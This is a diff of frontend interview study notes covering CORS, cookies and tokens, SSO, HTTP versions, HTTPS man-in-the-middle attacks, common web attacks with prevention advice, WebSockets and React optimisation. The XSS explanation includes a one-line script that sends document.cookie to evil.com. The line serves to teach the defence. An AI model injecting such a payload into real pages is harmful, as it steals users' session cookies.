+4. **Cross-Origin Requests without Preflight**: Not all cross-origin requests need a preflight. Simple requests, like using GET or POST with certain headers, might not trigger this preflight check. However, more complex requests, especially those using methods like PUT or DELETE, or containing custom headers, generally require a preflight check.
+
+### CORS Solutions
+
+**Solution 1: JSONP Approach**
+```html
+<!-- On the client side -->
+<script>
+    window.onSuccess = function (data) {
+        console.log(data);
+    }
+</script>
+<script src="https://www.example.com/api/getData"></script>
+```
+In the JSONP (JSON with Padding) approach, a `<script>` tag is used to bypass the same-origin policy. The external script contains a function call with the desired data. While this method can circumvent CORS restrictions, it's limited in functionality and security.
+
+**Solution 2: Server-Side CORS Configuration (Preferred)**
+```javascript
+// Server-side configuration for CORS
+response.setHeader("Access-Control-Allow-Origin", "http://localhost:8011"); // or use '*' for all origins
+response.setHeader("Access-Control-Allow-Headers", "X-Requested-With");
+response.setHeader("Access-Control-Allow-Methods", "PUT, POST, GET, DELETE, OPTIONS");
+response.setHeader("Access-Control-Allow-Credentials", "true"); // Allow cookies
+```
+This approach involves configuring the server to send appropriate CORS headers, allowing requests from specific origins or methods. It's the preferred method for handling cross-origin requests as it provides better control and security.
+
+### Conclusion
+An OPTIONS request is vital in the CORS process to ensure secure cross-origin communication. It helps browsers determine whether the server's CORS policy permits the actual request, thus enhancing web security by allowing servers to specify who can access their resources and how.
+
+## What is Restful API
+RESTful APIs are architectural guidelines for designing networked applications. They rely on stateless, client-server communication, where operations are performed using standard HTTP methods. For managing a blog, RESTful APIs provide endpoints for creating (POST), deleting (DELETE), updating (PATCH or PUT), and querying (GET) blog posts. Each operation targets a specific resource, identified by a URL, and uses the appropriate HTTP method to convey the action. For updates, PUT replaces an entire resource, while PATCH modifies parts of it, making PATCH more suitable for updates where only a few fields change. This approach to API design promotes scalability, simplicity, and flexibility.
+
+## What is the difference between a token and a cookie in web requests?
+
+### Cookie
+A cookie is a small piece of data sent from a website and stored on the user's computer by the web browser while browsing. Cookies enable websites to remember stateful information (such as items in a shopping cart) or to record browsing activities (like logging in or visiting pages). They are also used to recall information entered into form fields, such as names and addresses.
+
+- Cookies help maintain a user's session by being included in every request to identify the session due to HTTP's stateless nature.
+- Servers send a "Set-Cookie" header to the client, with cookies limited to 4KB.
+- Cookies are subject to Same-Origin Policy (SOP), preventing them from being shared across different origins.
+- Before HTML5, cookies were used for data storage, but LocalStorage and SessionStorage are now preferred.
+
+### Modern Browser Restrictions on Third-Party Cookies
+Modern browsers are limiting or blocking third-party cookies to improve privacy. This is aimed at reducing third-party ads and trackers that invade privacy, separate from the Same-Origin Policy.
+
+### Cookie and Session
+- **Cookies** are used for login authentication, storing identifiers like a user ID.
+- **Sessions** are server-side storage of user information linked to cookie identifiers.
+- Cookies and sessions together maintain authenticated states across web requests. The process typically involves the client sending credentials, the server updating the session and setting a cookie, and subsequent requests being personalized and secure based on the cookie.
+
+### Token
+- Tokens, unlike cookies, are not part of the HTTP standards and can be customized. They need manual storage, such as in LocalStorage.
+- Tokens are not automatically managed by browsers and must be manually set and sent in headers, for example, as "Authorization: Bearer <token>".
+- Unlike cookies, tokens do not have inherent CORS limitations.
+- **JWT (JSON Web Token)** is a common type of token that involves the backend authenticating a login request and returning an encrypted string token, which the client stores and includes in the header of subsequent requests.
+
+### Follow up: Session vs Token, which is better
+The choice between session and token-based authentication depends on the specific requirements and constraints of the application.  
+For applications prioritizing server control over user sessions, quick user management actions, and where server resources are not a major concern, session-based authentication may be preferred.  
+For applications requiring scalability across multiple servers, reduced server load, and flexibility in handling requests from various domains (thus minimizing CORS issues), token-based authentication is often the better choice.  
+Both approaches have their merits and drawbacks, and the decision should align with the application's architectural needs, security requirements, and expected user load.  
+
+### Follow up: How to Achieve SSO (Single Sign-On)?
+
+Single Sign-On (SSO) is an authentication process that allows a user to access multiple systems with one set of login credentials. This process involves three parties: the client side, the server side (System A), and a third-party SSO provider. The SSO flow typically follows these steps:
+
+1. **Client Side Accesses System A**: The user tries to access System A.
+2. **Authentication Failure**: System A checks for a valid certificate. Finding none, it informs the client that authentication has failed and login is required.
+3. **Redirect to SSO Provider**: The client is redirected to the SSO provider because it lacks an SSO certificate.
+4. **SSO Login Request**: The SSO provider requests the client to log in.
+5. **Client Side Login**: The user logs in to the SSO provider.
+6. **SSO Certificate and Token Issuance**: Upon successful login, the SSO provider issues a ticket (token) and an SSO certificate to the client.
+7. **Certificate Storage on Client Side**: The client stores the SSO certificate.
+8. **System A Validates Certificate**: The client attempts to access System A again, this time presenting the SSO certificate. System A contacts the SSO provider to validate the certificate.
+9. **Certificate Validation by SSO Provider**: The SSO provider authenticates the certificate and validates the ticket.
+10. **Valid Ticket Acknowledgment**: System A receives a message from the SSO provider that the ticket is valid and proceeds to process the client's request.
+11. **Data Returned to Client Side**: System A returns the requested data to the client.
+
+**Key Concepts Related to SSO:**
+
+- **SSO Certificate**: A digital certificate that confirms the user's identity. It's used by the client to prove authentication without logging in again.
+- **Token (Ticket)**: A unique piece of data issued by the SSO provider that represents the user's authentication state. It's used for validating the user's session without re-entering credentials.
+- **Authentication Flow**: The process by which a user's identity is verified across multiple applications or systems using a single set of credentials managed by the SSO provider.
+
+**Benefits of SSO:**
+
+- **Enhanced User Experience**: Users need to log in only once to access multiple applications, simplifying their interaction with web services.
+- **Improved Security**: Centralizes the management of user credentials and authentication processes, reducing the likelihood of password fatigue and the risks associated with managing multiple credentials.
+- **Simplified Administration**: Eases the burden of password resets, account lockouts, and other administrative tasks related to user access across multiple systems.
+
+## Difference between HTTP and UDP
+
+HTTP (Hypertext Transfer Protocol) and UDP (User Datagram Protocol) operate at different layers of the network stack, with HTTP functioning at the application layer and UDP at the transport layer.
+
+### HTTP
+- **Layer**: Application
+- **Connection**: Connection-oriented
+- **Reliability**: HTTP is built on TCP (Transmission Control Protocol), which ensures reliable transmission of data through error checking and retransmission of lost packets.
+- **Use Cases**: Web browsing, form submission, data transfer in a reliable and ordered manner.
+- **Characteristics**: HTTP requests and responses are structured in a predefined format, allowing for complex web interactions, including state management through cookies, authentication, and caching strategies.
+
+### UDP
+- **Layer**: Transport
+- **Connection**: Connectionless
+- **Reliability**: Does not guarantee delivery, order, or error checking, making it less reliable but faster compared to TCP.
+- **Use Cases**: Streaming media (video, audio), online gaming, voice over IP (VoIP) where speed is crucial and occasional data loss is acceptable.
+- **Characteristics**: Suitable for applications that require fast, efficient transmission, such as live broadcasting or multiplayer online games.
+
+#### OSI Model Layers
+1. Application Layer
+2. Presentation Layer
+3. Session Layer
+4. Transport Layer (TCP, UDP)
+5. Network Layer
+6. Data Link Layer
+7. Physical Layer
+
+#### TCP/IP Model Layers
+1. Application Layer (HTTP, DNS, SMTP)
+2. Transport Layer (TCP, UDP)
+3. Internet Layer (IP)
+4. Network Interface Layer
+
+### Follow-up: Difference between HTTP 1.0, 1.1, and 2.0
+
+#### HTTP 1.0
+- **Features**: Basic protocol supporting GET and POST methods.
+- **Connection**: Each request opens a new TCP connection, leading to overhead and latency.
+
+#### HTTP 1.1
+- **Features**: Introduced more sophisticated caching mechanisms (Cache-Control, ETag), persistent connections (`Connection: keep-alive`) to allow multiple requests over a single connection, range requests, and additional methods like PUT and DELETE for RESTful APIs.
+- **Performance**: Reduced latency by reusing connections, introduced chunked transfer encoding for dynamic content.
+
+#### HTTP 2.0
+- **Features**: Significantly improved performance through header compression (reducing overhead), multiplexing (allowing multiple requests and responses to be in flight simultaneously over a single TCP connection), and server push capabilities.
+- **Adoption**: Increasingly widespread, offering substantial efficiency improvements over HTTP/1.x.
+
+### Clarifications and Corrections
+- The OSI model does not include a "web layer" but rather a network layer.
+- The TCP/IP model simplifies the OSI layers into four layers, focusing on the internet protocol suite.
+- HTTP 2.0 is not "the newest version" as HTTP/3 is emerging, utilizing QUIC (a transport layer network protocol) over UDP for even better performance in certain conditions.
+
+## What is an HTTPS Man-in-the-Middle Attack? How Can It Be Prevented?
+
+A Man-in-the-Middle (MitM) attack occurs when an attacker intercepts the communication between two parties, usually with the intent to secretly listen in or modify the messages being exchanged. In the context of HTTPS, this can be particularly damaging as HTTPS is designed to secure transmissions over the web, making any breach a serious concern.
+
+### Symmetrical Encryption
+Symmetrical encryption uses a single key for both encryption and decryption. This method is efficient and less resource-intensive, making it a cost-effective solution for many encryption needs.
+
+### Asymmetrical Encryption
+Asymmetrical encryption, on the other hand, involves two keys: a public key for encryption and a private key for decryption. This type of encryption is more secure but also more resource-intensive, leading to higher costs.
+
+### HTTPS Encryption Process
+- HTTP transmits data in plain text, making it vulnerable to interception and eavesdropping.
+- HTTPS enhances security by encrypting the data transmitted between the client and the server. The encryption process involves:
+  1. The client generates a random key and encrypts it with the server's public key, then sends this encrypted key to the server.
+  2. The server decrypts the received key using its private key.
+  3. Both parties use the random key for symmetric encryption, securing the subsequent communication.
+
+The initial exchange of the random key uses asymmetrical encryption, ensuring that only the server can decrypt the key with its private key. The subsequent communication is secured through symmetrical encryption.
+
+### Man-in-the-Middle Attack
+During the asymmetrical encryption step, there's a risk that an attacker could intervene by presenting the client with the attacker's public key instead of the server's. This allows the attacker to decrypt, read, and potentially alter the communication by hijacking the session key.
+
+### Prevention Measures
+The primary defense against MitM attacks in the context of HTTPS is the use of certificates. Certificates are digital documents that verify the identity of the parties involved in the communication. They are issued by trusted third-party organizations known as Certificate Authorities (CAs). To prevent MitM attacks, it is crucial to:
+- Ensure that the website's certificate is valid and issued by a reputable CA.
+- The browser checks that the domain name in the certificate matches the website's domain.
+- Use certificates from CAs that have established trust relationships with major browser vendors.
+
+By adhering to these practices, both website owners and users can significantly reduce the risk of falling victim to MitM attacks, ensuring that their communications remain secure and private.
+
+## Front-End Security Threats and Prevention Measures
+
+### XSS (Cross-Site Scripting)
+XSS attacks occur when an attacker injects malicious JavaScript code into a web application's output. The injected code executes within the victim's browser when they visit the compromised web page.
+
+**Example:** An attacker could embed a script in a comment on a blog that sends the cookies of anyone viewing the comment to the attacker. This script might look something like `<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>`.
+
+**Prevention:** Ensure the encoding or escaping of user input on both the front-end and back-end. For example, convert `<` to `&lt;` and `>` to `&gt;`. Modern JavaScript frameworks like React automatically escape HTML to safeguard against XSS, significantly reducing the risk.
+
+### CSRF (Cross-Site Request Forgery)
+In CSRF attacks, attackers trick users into executing unwanted actions on a web application where they're authenticated, leveraging the user's identity.
+
+**Example:** An attacker sends an email with a link to a malicious website. When the logged-in user clicks the link, the malicious site sends a request to a banking application to transfer money, exploiting the user's authenticated session.
+
+**Prevention:** Employ anti-CSRF tokens and set the `SameSite` attribute for cookies to `strict` to prevent cross-site request forgery. Limiting CORS (Cross-Origin Resource Sharing) and utilizing authentication mechanisms also bolster security.
+
+### Clickjacking
+Clickjacking tricks users into clicking on something different from what the user perceives, often by embedding a page as a transparent iframe.
+
+**Example:** An attacker places a transparent iframe over a button on a legitimate website. The user thinks they are clicking the legitimate button, but they are actually clicking a button within the iframe, potentially revealing sensitive information or agreeing to a malicious action.
+
+**Prevention:** To prevent clickjacking, ensure that your website does not allow itself to be embedded in an iframe on another site by setting the `X-Frame-Options` header to `SAMEORIGIN`. Also, verify that `window.top.location.hostname` is the same as `window.location.hostname`; if not, redirect the user appropriately.
+
+### DDoS (Distributed Denial of Service)
+DDoS attacks flood a server with numerous requests to exhaust resources and bandwidth, rendering the service unavailable to legitimate users.
+
+**Example:** A group of compromised computers (botnet) is used to flood an e-commerce site with so much traffic that legitimate customers cannot access the site during a major sale event.
+
+**Prevention:** DDoS protection is challenging to implement at the software level alone; employing cloud-based DDoS protection services or Web Application Firewalls (WAF) can help mitigate these attacks.
+
+### SQL Injection
+SQL Injection attacks occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application.
+
+**Example:** An attacker inserts a SQL statement into a form field (e.g., login form) that is designed to log in users. This SQL statement is crafted to grant the attacker unauthorized access to the database, potentially allowing them to view sensitive information.
+
+**Prevention:** Safeguard against SQL Injection by validating and sanitizing all user inputs. Utilize prepared statements and parameterized queries to ensure the database executes only the intended queries, not the injected malicious code.
+
+### Best Practices for Prevention
+Implementing robust security measures on both the front-end and back-end is crucial for protecting web applications against these attacks. This includes validating user inputs, employing security headers, and adhering to secure coding practices. Regular security audits and updates can also significantly reduce vulnerabilities.
+
+## Websocket vs HTTP Protocol
+
+### Websocket Protocol
+- **Supports peer-to-peer communication**: Unlike HTTP, which is primarily designed for client-server communication, Websockets enable real-time, bi-directional communication between the client and server.
+- **Protocol Name**: The Websocket protocol is indicated by `ws://` or `wss://` for secure Websockets, similar to how `http://` and `https://` indicate HTTP and HTTPS protocols.
+- **Initiation**: A Websocket connection can be initiated by either the client or server side. This flexibility is particularly useful for applications that require real-time data exchange.
+- **Use Cases**: It is widely used in applications requiring real-time interaction, such as message notifications, live discussion rooms, and collaborative editing platforms.
+- **CORS Policy**: Websockets are not subject to the same-origin policy, which restricts how a document or script loaded from one origin can interact with resources from another origin. This means Websockets do not have CORS limitations.
+- **Communication**: Communication over a Websocket is achieved through the `send` method for sending messages and the `onmessage` event handler for receiving messages. This contrasts with the request-response model used by HTTP.
+- **Security**: A Websocket connection can be upgraded to a secure connection (`wss://`), analogous to upgrading HTTP to HTTPS, to ensure encrypted communication.
+
+### Connection Steps
+1. The process begins with a standard HTTP request.
+2. If successful, the connection is upgraded to a Websocket protocol for ongoing communication.
+
+### A Discussion Room Code Example: Node.js Side
+```js
+const { WebSocketServer } = require('ws');
+const wsServer = new WebSocketServer({ port: 3000 });
+const list = new Set();
+
+wsServer.on('connection', curWs => {
+    console.info('Connected');
+    list.add(curWs);
+    // Implement cleanup mechanism here to remove inactive connections
+
+    curWs.on('message', msg => {
+        console.info('Received message:', msg.toString());
+        // Broadcast to other clients
+        list.forEach(ws => {
+            if (ws === curWs) return;
+            ws.send(msg.toString());
+        });
+    });
+});
+```
+*Note: It's important to implement a cleanup mechanism to remove inactive connections to prevent memory leaks.*
+
+### Code Example: Website Side
+```html
+<script>
+    const ws = new WebSocket('ws://127.0.0.1:3000');
+    ws.onopen = () => {
+        console.info('Opened');
+        ws.send('Client opened');
+    };
+    ws.onmessage = event => {
+        console.info('Received message:', event.data);
+    };
+
+    const btnSend = document.getElementById('btn-send');
+    btnSend.addEventListener('click', () => {
+        console.info('Clicked');
+        ws.send('Current time: ' + Date.now());
+    });
+</script>
+```
+
+### Socket.IO
+In practice, for ease of use and additional features, developers often use libraries like Socket.IO. Socket.IO abstracts the complexities of Websockets and provides a cleaner API, such as `socket.emit()` for sending messages and `io.on()` for listening to events.
+
+### Difference between WebSocket and HTTP: keep-alive
+
+The main difference between WebSocket and HTTP with the `keep-alive` connection option lies in the nature of the communication and the initiation of requests.
+
+#### HTTP: keep-alive
+- **Connection Type**: HTTP is a stateless protocol. By default, each request/response pair is followed by closing the connection. However, with the `keep-alive` option, the connection between the client and server can be kept open, allowing multiple requests to be sent over the same connection without having to re-establish it each time.
+- **Client-Initiated**: In an HTTP communication, even with `keep-alive`, the client initiates all requests. The server cannot send data to the client unless the client first sends a request. This means the server must wait for the client to request data before it can send any.
+- **Server Response**: With `keep-alive`, the server holds the connection open for a specified time (or until a specified number of requests have been sent), allowing for faster subsequent requests by avoiding the overhead of establishing new connections. However, the server is essentially in a wait state, responding to client requests as they come in without the ability to initiate communication.
+- **Timeouts and Retries**: If the server takes too long to respond, the client might face timeouts and may need to retry its request. This mechanism doesn't inherently solve issues related to real-time data exchange or server push capabilities.
+
+#### WebSocket
+- **Bi-Directional Communication**: WebSocket provides a full-duplex communication channel that operates over a single, long-lived connection. Once established, this connection allows either the client or the server to initiate messages, breaking away from the request-response model.
+- **Server and Client Initiation**: Unlike HTTP, WebSocket allows the server to send data to the client at any time once the WebSocket connection is established. This makes it ideal for real-time applications where the server needs to push updates to the client without waiting for a request.
+- **Real-Time Interaction**: WebSocket is designed for applications that require real-time data exchange, such as live chat, gaming, or financial trading applications, where the overhead of establishing new connections for each message (as in HTTP) would be prohibitive.
+- **Efficiency and Performance**: WebSocket connections are more efficient for real-time communication because they eliminate the HTTP overhead after the initial handshake. This makes WebSocket a better choice for scenarios where performance and latency are critical.
+
 # 5. Browser&NodeJS.md
 
 ## Explain how the stack is used in memory management for frontend applications
@@ -3100,238 +2915,424 @@ Performance optimization is a gradual process, unlike bug fixes which can often 
 ### Summary
 Analyze performance metrics to identify the root causes of slowness, address issues specifically, and continuously improve and optimize for better performance.
 
-# 1. HTML&CSS.md
+# 6. React.md
 
-## CSS Units: Differences and Usage
+## Is Virtual DOM (VDOM) fast?
 
-1. **Pixels (px):** Pixels are a fixed-size unit that is most commonly used in screen media. A pixel is an absolute unit that doesn't change based on other elements. It's great for when you need precise control over element sizing, like for borders or shadows.
+The Virtual DOM (VDOM) is a core concept in modern web development, particularly in frameworks like React and Vue. It's a lightweight representation of the actual DOM (Document Object Model) in the form of JavaScript objects. While the Virtual DOM was popularized by React, it's now widely used across different front-end frameworks due to its advantages in updating user interfaces.
 
-2. **Percent (%):** Percentages are relative units and depend on the parent element's size. They are extremely useful for creating layouts that adapt to different screen sizes, maintaining proportions regardless of the parent size.
+### Understanding Virtual DOM and Its Performance
 
-3. **Ems (em):** Ems are relative to the font-size of the element they are used on. If used on font-size, they are relative to the font-size of the parent element. Ems are great for scalable typography and elements that need to maintain their proportions relative to text size.
+The speed of the Virtual DOM depends on the context of comparison. When comparing the direct manipulation of the real DOM (as in libraries like jQuery) to the Virtual DOM approach, direct DOM manipulation can be quicker for simple, isolated operations. This is because it involves a direct interaction with the browser's rendering pipeline. However, this approach can become inefficient and less scalable in complex applications.
 
-4. **Rems (rem):** Rems are relative to the font-size of the root element (html). They allow for consistent scaling across the entire document and are very useful in responsive design for maintaining uniformity in spacing, layout, and typography.
+The Virtual DOM provides an abstraction layer that allows for a more declarative way of defining UI components and their state changes. Here's how it works:
+1. Upon data changes in the application, the UI is re-rendered in the Virtual DOM.
+2. A diffing algorithm compares this new Virtual DOM with the previous snapshot to identify the minimal set of changes needed for the real DOM.
+3. These changes are batched and applied to the real DOM efficiently, reducing direct manipulation and reflow/repaint costs.
 
-5. **Viewport Width (vw):** 1vw is equal to 1% of the viewport's width. This unit is helpful for creating elements that scale with the width of the viewport, like for fluid layouts and typography.
+### Advantages of Using Virtual DOM
 
-6. **Viewport Height (vh):** Similarly, 1vh is 1% of the viewport's height. It's useful for elements that should scale with the height of the viewport, such as sections of a single-page layout.
+- **Component-Based Architecture**: React and Vue use a component-based structure, encapsulating UI and business logic into reusable components, which enhances development scalability and manageability.
+- **Separation of Concerns**: These frameworks separate the data model from the UI (view), leading to a more predictable data flow and easier state management.
+- **Efficiency in Development**: Developers can concentrate on state management and business logic rather than direct DOM manipulations, resulting in more maintainable code and quicker development cycles.
 
-7. **Viewport Minimum (vmin):** This unit is 1% of the viewport's smaller dimension (height or width). Vmin is particularly useful for maintaining aspect ratios in responsive design.
+In conclusion, the Virtual DOM is not inherently faster than direct DOM manipulation for every operation. However, it provides a more efficient and effective approach for dynamic web applications, particularly those with complex interfaces and frequent state changes. Its efficiency stems from reducing the amount of direct DOM manipulation, leading to improved performance in applications where state changes are common.
 
-8. **Viewport Maximum (vmax):** Conversely, vmax is 1% of the larger dimension (height or width). It's less commonly used but can be beneficial for certain design challenges.
+## What is `window.requestIdleCallback`? What's the difference between `requestIdleCallback` and `requestAnimationFrame`?
 
-## Example of Responsive Design Code
-```css
-/* Base HTML font size */
-html {
-    font-size: 16px; /* Set a standard font size */
+`window.requestIdleCallback` is a method that allows developers to queue a function to be executed when the browser is idle. This API provides an opportunity to perform background and low-priority work without interfering with critical animations or input response times. It's particularly useful for tasks that aren't time-critical, such as analytics and background data processing.
+
+### React Fiber
+
+React Fiber is a reimplementation of React's core algorithm. It changes the component tree structure to a linked list, enabling incremental rendering. This means that rendering work can be split into chunks and spread out over multiple frames. Fiber's architecture allows React to pause rendering to handle more urgent tasks and then resume when the browser is idle. This is where `requestIdleCallback` becomes relevant; it provides a native way to schedule these low-priority tasks during idle times, enhancing performance without sacrificing user experience.
+
+However, it's important to note that `requestIdleCallback` may have compatibility issues with Safari and Internet Explorer.
+
+### Difference between `requestIdleCallback` and `requestAnimationFrame`
+
+- **`requestAnimationFrame`** is designed for animations and executes just before each repaint, ensuring smooth visual updates. It has a higher priority because maintaining a high frame rate is crucial for animations and user interface responsiveness.
+- **`requestIdleCallback`**, on the other hand, is intended for tasks that can wait until the main thread is idle. It runs with lower priority, making it suitable for non-urgent tasks that don't need to be completed immediately.
+
+Both `requestAnimationFrame` and `requestIdleCallback` are considered macro tasks in the JavaScript event loop, but they serve different purposes based on their execution timing and priority levels.
+
+## Difference Algorithm and Implementation in React
+
+### Difference Algorithm
+The difference algorithm, often referred to as the "diff" algorithm, plays a crucial role in determining how to update the DOM by comparing two versions of the virtual DOM. Here’s how it works:
+- The algorithm compares components at the same hierarchical level in the virtual DOM tree, avoiding cross-level comparisons.
+- If it detects different tags, it will remove the old component and construct a new one instead of delving into further details.
+- For child components, the comparison is facilitated by unique "keys," which underscore the significance of assigning keys to list items.
+
+### React's Difference Algorithm
+React's diff algorithm employs an efficient strategy known as "right shifting." This means that during a comparison, if elements have only moved backward (to the right) in the list, React will move the elements accordingly instead of recreating them. This approach minimizes unnecessary DOM manipulations, leading to better performance.
+
+### Importance of Keys
+Keys are vital for optimizing the rendering process in React. When keys are provided, React uses them to identify which elements have changed, been added, or been removed. This helps in:
+- Precisely moving elements in the DOM without having to rebuild them, thus saving time and computational resources.
+- Increasing efficiency, especially in dynamic lists where the order of elements might change over time. Without keys, React would have to rebuild the entire list to ensure accuracy, which is far less efficient.
+
+## In practical work, how have you optimized React?
+
+### Modify CSS to simulate v-show
+Using inline CSS to conditionally display components can be optimized to avoid conditional rendering blocks and improve readability:
+
+```ts
+{/* Instead of conditionally rendering the component twice */}
+{!flag && <MyComponent style={{display: 'none'}}/>}
+{flag && <MyComponent />}
+
+// Use a single line with conditional styling
+<MyComponent style={{display: flag ? 'block' : 'none'}} />
+```
+
+### Use keys in loops
+Using a unique `key` prop in a list helps React identify which items have changed, added, or removed, which can improve the performance of list updates:
+
+```ts
+const todoItems = todos.map(todo => 
+    // Avoid using the index as a key if the list can change
+    <li key={todo.id}>
+        {todo.text}
+    </li>
+)
+```
+
+### Use Fragment to reduce DOM depth
+React Fragments allow you to group a list of children without adding extra nodes to the DOM, which can lead to a more performant and cleaner DOM structure:
+
+```ts
+return <>
+    <div>1</div>
+    <div>2</div>
+</>
+```
+
+### Do not define functions in JSX
+Defining functions directly in JSX can lead to performance issues as the function will be recreated on every render. Instead, define your function outside the JSX return statement:
+
+```ts
+// Avoid defining functions directly in the JSX
+<button onClick={() => {...}}>Click Me</button>
+
+// Prefer defining your function outside and referencing it in JSX
+function MyComponent() {
+    const handleClick = () => {...}
+    return <button onClick={handleClick}>Click Me</button>
 }
+```
 
-/* Responsive font size for smaller screens */
-@media only screen and (max-width: 300px) {
-    html {
-        font-size: 14px; /* Reduce font size on small devices */
+### Bind `this` in the constructor
+For class components, it's important to bind `this` in the constructor to ensure that `this` refers to the component instance in your event handlers:
+
+```ts
+class MyComponent extends React.Component {
+    constructor(props) {
+        super(props)
+        // Bind this in the constructor
+        this.handleClick = this.handleClick.bind(this)
+    }
+    handleClick() { /* Now `this` refers to the component instance */ }
+    
+    // Arrow functions automatically bind `this` to the class instance
+    handleClick2 = () => { /* Arrow function, no need to bind this */ }
+    
+    render() {
+        return <button onClick={this.handleClick}>Click Me</button>
     }
 }
+```
 
-/* Paragraph styling */
-p {
-    font-size: 1rem; /* Font size is relative to HTML element */
-    line-height: 1.5; /* Good for readability */
-    margin: 0 0 1rem 0; /* Spacing for paragraphs */
+### Use shouldComponentUpdate or React.PureComponent
+#### `shouldComponentUpdate`
+
+The `shouldComponentUpdate` method is available in class components and allows you to prevent unnecessary re-renders by manually determining whether a component should update in response to changes in props or state. It receives the next props and state as arguments and returns a boolean value indicating whether React should continue with the rendering process.
+
+Implementing `shouldComponentUpdate` can significantly improve performance, particularly in cases where you know that the UI does not need to update in response to certain changes.
+
+```ts
+class MyComponent extends React.Component {
+  shouldComponentUpdate(nextProps, nextState) {
+    // Only re-render if the next id is different from the current one
+    return nextProps.id !== this.props.id;
+  }
+  
+  render() {
+    return <div>{this.props.id}</div>;
+  }
 }
+```
 
-/* Responsive element styling */
-@media only screen and (max-width: 768px) {
-    p {
-        font-size: 0.9rem; /* Smaller font size on tablets and smaller devices */
+In the example above, the component will only re-render if the `id` prop changes. This manual comparison can be very efficient but requires careful implementation to avoid missed updates or stale renders.
+
+#### `React.PureComponent`
+
+`React.PureComponent` is a base class for class components that automatically implements `shouldComponentUpdate` with a shallow prop and state comparison. When your component extends `React.PureComponent`, React will shallowly compare the old props and state with the new ones and re-render the component only if there was a change.
+
+This is particularly useful for components that have simple props and state structures where a shallow comparison is sufficient to detect changes.
+
+```ts
+class MyComponent extends React.PureComponent {
+  render() {
+    return <div>{this.props.id}</div>;
+  }
+}
+```
+
+While `React.PureComponent` reduces the need to manually implement `shouldComponentUpdate`, it's important to remember that it performs a shallow comparison. This means it might not work as expected if your props or state include complex data structures like nested objects or arrays that might change internally without changing their identity.
+
+#### `React.memo`
+
+For functional components, which cannot extend `React.PureComponent` or implement `shouldComponentUpdate`, React provides the `React.memo` higher-order component. Similar to `React.PureComponent`, `React.memo` wraps a functional component and adds a memoization feature, performing a shallow comparison of the component's props. If the props are the same as the previous render, React will skip rendering the component and reuse the last rendered result.
+
+```ts
+const MyComponent = React.memo(function MyComponent(props) {
+  return <div>{props.id}</div>;
+});
+```
+
+`React.memo` is a powerful tool for optimizing functional components, especially when they are expected to render often with the same props. For more complex comparison logic, `React.memo` accepts a second argument, a custom comparison function, giving you control over the comparison logic similar to `shouldComponentUpdate`.
+
+```ts
+const MyComponent = React.memo(function MyComponent(props) {
+  // Component body
+}, (prevProps, nextProps) => {
+  // Return true if passing nextProps to render would return
+  // the same result as passing prevProps, false otherwise
+  return prevProps.id === nextProps.id;
+});
+```
+
+## Common Pitfalls Encountered When Using React
+
+### Naming Conventions for Custom Components
+- Custom component names must start with an uppercase letter to differentiate them from native HTML tags. For example, `<Input/>` is a custom component, while `<input/>` refers to the standard HTML input element.
+
+### Wrapping Variables with Braces Inside JSX
+- Variables inside JSX should be wrapped in curly braces `{}`. For instance, `<Input value={value} />` correctly binds the `value` variable to the `Input` component's `value` property.
+
+### Asynchronous `setState`
+- The `setState` function updates the component state asynchronously. This means you should not expect the state to reflect the new value immediately after calling `setState`. For synchronous logic post-state update, use `setState`'s callback function.
+
+## Unified Error Handling in React
+
+### ErrorBoundary Component
+- The `ErrorBoundary` component is used to catch JavaScript errors anywhere in their child component tree, log those errors, and display a fallback UI instead of the component tree that crashed.
+- It only catches errors in the rendering phase, meaning it does not catch errors in event handlers or asynchronous code.
+- It works in production environments, but in development, React still displays errors in the UI for better debugging experience.
+
+#### Code Example
+
+```typescript
+class ErrorBoundary extends React.Component {
+  constructor(props) {
+    super(props);
+    this.state = { hasError: false };
+  }
+
+  static getDerivedStateFromError(error) {
+    // Update state to render fallback UI on next render
+    console.info('getDerivedStateFromError', error);
+    return { hasError: true };
+  }
+
+  componentDidCatch(error, errorInfo) {
+    // Log the error for further analysis
+    console.error('componentDidCatch', error, errorInfo);
+  }
+
+  render() {
+    if (this.state.hasError) {
+      // Display fallback UI
+      return <h1>Something went wrong.</h1>;
     }
+    // Render children components if no error
+    return this.props.children; 
+  }
 }
 ```
 
-This example demonstrates responsive typography using rem units and media queries. The base font size is set on the `html` element, which the `rem` units reference. Media queries adjust the base font size for smaller screens, affecting all elements using `rem`. The `p` (paragraph) styling is also adjusted for smaller screens to ensure readability.
+### Handling Errors Outside of ErrorBoundary
 
-## Box Model Explanation
+#### Event Errors
+- `ErrorBoundary` does not catch errors from DOM events such as `onClick`. You can use `window.onerror` for global error handling or `try...catch` blocks within event handlers.
 
-The CSS box model is a fundamental concept in web development that describes how the dimensions of each HTML element are calculated. The components of the box model, from outer to inner, are:
+#### Asynchronous Errors
+- `ErrorBoundary` does not catch errors in asynchronous operations like `setTimeout`. Similar to event errors, use `window.onerror` or specific error handling logic in your asynchronous code.
 
-1. **Margin**: The outermost layer, which defines the space between the element's border and surrounding elements.
-2. **Border**: The border that surrounds the padding and content. It's the boundary between the margin and the padding.
-3. **Padding**: The space between the border and the content. It increases the space inside the element.
-4. **Content**: The innermost area where the actual text, images, or other media are displayed.
-5. **Box-sizing**: A property that determines how the width and height of an element are calculated. If set to `border-box`, the element's padding and border are included in the element's width and height. If set to `content-box`, the width and height only include the content, not the padding or border. 
+#### Extension: Unhandled Promise Rejections
+- Use the `window.onunhandledrejection` event to listen for unhandled promise rejections, providing an opportunity to handle these and prevent the application from crashing.
 
-## Differences Between offsetHeight, scrollHeight, and clientHeight
+### Error Reporting and Monitoring
+- Implementing error reporting and monitoring (also known as error tracking or logging) is crucial for understanding and improving the stability of a React application. This involves capturing errors, logging them to a server, and analyzing them to fix bugs or improve application UX.
 
-1. **offsetHeight**: The `offsetHeight` property measures the total visible height of an element, including padding, border, and the scroll bar on the element (if any), but excluding margins. It's the outermost height measurement that includes everything inside the margin.
+## React Lifecycle
+The React component lifecycle refers to the series of events that occur from the moment a component is initially rendered until it is finally destroyed. Understanding these lifecycle events is crucial for creating efficient and effective React applications. The lifecycle can be divided into three main phases:
 
-2. **clientHeight**: The `clientHeight` property measures the visible content area (including padding) of an element but excludes the border, scrollbar, and margin. It's useful for getting the actual area available for the content inside an element.
+### Mounting
+Mounting is the phase in which a React component is being inserted into the DOM (Document Object Model). It encompasses the following lifecycle methods:
+- `constructor()`: This method is called before anything else, when the component is initiated. It's commonly used to initialize state or bind event handlers.
